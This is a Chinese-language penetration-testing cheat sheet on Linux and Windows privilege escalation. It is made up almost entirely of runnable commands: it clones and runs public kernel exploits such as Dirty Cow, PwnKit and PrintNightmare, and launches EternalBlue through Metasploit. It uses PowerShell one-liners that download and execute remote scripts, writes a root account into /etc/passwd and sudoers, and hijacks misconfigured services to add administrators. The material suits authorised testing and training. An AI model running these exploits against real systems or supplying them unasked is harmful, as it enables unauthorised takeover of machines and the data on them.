---
id: 04-003
title: "⬆️ 内核漏洞与服务配置错误提权 (Kernel Exploit & Service Misconfig PrivEsc)"
category: 权限提升
category_en: "Privilege Escalation"
difficulty: ★★★★
tools: "漏洞利用代码, MSF模块, 自定义exp"
last_updated: 2025-07
tags: ["privilege-escalation", "linux-privilege", "windows-privilege", "credential-theft"]
subdomain: privilege-escalation
nist_csf: ["PR.AC-01", "DE.CM-04"]
mitre_attack: ["T1068", "T1548", "T1055", "T1003"]
---
# ⬆️ 内核漏洞与服务配置错误提权 (Kernel Exploit & Service Misconfig PrivEsc)

## 概述
利用操作系统内核漏洞和系统服务配置错误进行权限提升。

## 核心技能

### 1. Linux内核漏洞提权

```bash
# Dirty Cow (CVE-2016-5195)
# Linux内核 2.6.22 ~ 4.8
git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow.github.io
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w /etc/passwd "root:\$1\$new\$pssbNwEXbJ9VSLpPJ:0:0:root:/root:/bin/bash"
su root  # 密码: new

# Dirty Pipe (CVE-2022-0847)
# Linux 5.8 ~ 5.16
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit.c -o exploit
./exploit

# PwnKit (CVE-2021-4034)
# pkexec (所有主流发行版)
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
./cve-2021-4034

# CVE-2023-2640 / CVE-2023-3266 (GameOverlay)
# Ubuntu内核 5.19.0-46.1
git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-3262.git
cd CVE-2023-2640-CVE-2023-3262
chmod +x exploit.sh
./exploit.sh

# CVE-2022-25636 - nf_tables
# Linux 5.4-5.6
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit

# OverlayFS (CVE-2021-3493)
# Ubuntu 20.04, Linux 5.11以下
git clone https://github.com/briskets/CVE-2021-3493.git
cd CVE-2021-3493
gcc exploit.c -o exploit
./exploit
```

### 2. Windows内核漏洞提权

```powershell
# MS17-010 EternalBlue (SMB漏洞)
# 在MSF中使用
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.1
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 > run

# MS16-032 (Secondary Logon)
# PowerShell利用
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1'); Invoke-MS16032"

# CVE-2021-1732 (Win32k)
git clone https://github.com/KaLendsi/CVE-2021-1732-Exploit.git
# 编译后在目标上运行

# CVE-2021-40449 (Win32k Use-After-Free)
git clone https://github.com/KaLendsi/CVE-2021-40449-Exploit.git

# CVE-2022-21882 (Win32k)
git clone https://github.com/KaLendsi/CVE-2022-21882.git

# CVE-2023-21768 (AFD Driver)
git clone https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768.git

# PrintNightmare (CVE-2021-1675)
# 添加用户
git clone https://github.com/calebstewart/CVE-2021-1675.git
powershell -Exec Bypass -C "Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hack' -NewPassword 'Pass123!'"
```

### 3. Linux服务配置错误

```bash
# 可写/etc/passwd
# 检查权限
ls -la /etc/passwd
# 如果是可写的:
openssl passwd -1 -salt new password
echo "root:\$1\$new\$pssbNwEXbJ9VSLpPJ:0:0:root:/root:/bin/bash" >> /etc/passwd
su root  # 密码: password

# 可写/etc/sudoers
# 检查权限
ls -la /etc/sudoers
# 如果可写:
echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su

# NFS no_root_squash
# 检查/etc/exports
cat /etc/exports
# 如果包含 no_root_squash:
# 在攻击机上:
mount -t nfs 10.0.0.1:/shared /mnt/nfs
cp /bin/bash /mnt/nfs/
chmod +xs /mnt/nfs/bash
# 在目标机上:
/shared/bash -p

# Tmux会话劫持
# 检查已有的tmux会话
tmux ls
# 如果其他用户有可访问的tmux会话:
tmux attach-session -t target_session

# Screen会话劫持
screen -ls
screen -r target_session

# Python/脚本环境劫持
# PYTHONPATH劫持
echo 'import os; os.system("/bin/bash")' > /tmp/evil.py
export PYTHONPATH=/tmp:$PYTHONPATH

# Ruby环境劫持
export RUBYLIB=/tmp/evil.rb
```

### 4. Windows服务配置错误

```powershell
# 未加引号的服务路径 (Unquoted Service Path)
# 检测
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\"
# 或
Get-CIMInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *'}

# 利用（假设路径: C:\Program Files\My App\Service.exe）
# 创建 C:\Program.exe 或 C:\Program Files\My.exe
copy /y C:\Tools\nc.exe "C:\Program Files\My.exe"
# 等待或重启服务
sc stop "ServiceName"
sc start "ServiceName"

# 可写服务二进制
# 检查服务可执行文件的权限
icacls "C:\Path\To\Service\service.exe"
# 如果 Users 有 (F) 或 (M) 权限
# 替换为恶意文件
copy /y C:\malware.exe "C:\Path\To\Service\service.exe"
sc stop ServiceName
sc start ServiceName

# 可写服务
# 检查当前用户是否有权修改服务
accesschk.exe /accepteula -uwcqv "Users" "ServiceName"
# 如果有 SERVICE_CHANGE_CONFIG 权限
sc config ServiceName binpath="cmd.exe /c net localgroup administrators user /add"
sc stop ServiceName
sc start ServiceName

# 服务权限ACL配置错误
# 使用SharpUp
SharpUp.exe audit
```

### 5. Capabilities滥用 (Linux)

```bash
# 查找具有capabilities的可执行文件
getcap -r / 2>/dev/null

# 常见Capability滥用
# CAP_SYS_ADMIN - 挂载操作
# CAP_NET_RAW - 原始套接字
# CAP_DAC_OVERRIDE - 绕过DAC
# CAP_DAC_READ_SEARCH - 读取任何文件
# CAP_SETUID - 设置UID

# CAP_SETUID + CAP_SETGID
# 任何可执行文件有这些capability即可提权
# 编译: gcc -o cap_setuid cap_setuid.c
# cap_setuid.c:
# #include <unistd.h>
# int main() { setuid(0); system("/bin/bash"); }

# CAP_DAC_OVERRIDE - 绕过文件权限读取
# 使用cp或其他二进制读取受保护文件

# CAP_NET_RAW - 原始套接字
# 可以发送原始数据包（ARP欺骗、ICMP等）

# CAP_SYS_PTRACE - 进程跟踪
# 可调试其他进程，注入shellcode
```

### 6. 自动化提权检测

```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# WinPEAS
winpeas.exe

# PowerUp.ps1
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# Sherlock.ps1
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"

# 使用MSF本地漏洞检测
meterpreter > run post/multi/recon/local_exploit_suggester
# 或
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## 常见提权漏洞速查

| CVE编号 | 影响系统 | 利用文件 |
|:---|:---|:---|
| CVE-2021-4034 | Linux (pkexec) | PwnKit |
| CVE-2022-0847 | Linux 5.8-5.16 | Dirty Pipe |
| CVE-2016-5195 | Linux 2.6.22-4.8 | Dirty Cow |
| CVE-2021-3493 | Ubuntu 20.04 | OverlayFS |
| MS17-010 | Windows 7/2008 | EternalBlue |
| CVE-2021-40449 | Win10/2019 | Win32k UAF |
| CVE-2022-21882 | Win10/2019 | Win32k |
| CVE-2021-1675 | Windows | PrintNightmare |
| CVE-2021-1732 | Windows 10 | Win32k |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Linux Exploit Suggester | 内核漏洞检测 | https://github.com/mzet-/linux-exploit-suggester |
| PEASS-ng | 提权枚举套件 | https://github.com/carlospolop/PEASS-ng |
| Windows Exploit Suggester | 补丁对比 | https://github.com/AonCyberLabs/Windows-Exploit-Suggester |
| PowerSploit | Powershell渗透 | https://github.com/PowerShellMafia/PowerSploit |
| Exploit-DB | 漏洞利用库 | https://www.exploit-db.com/ |

## 参考资源
- [Exploit Database](https://www.exploit-db.com/)
- [HackTricks - Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [Windows Privilege Escalation Guide](https://github.com/frizb/Windows-Privilege-Escalation)
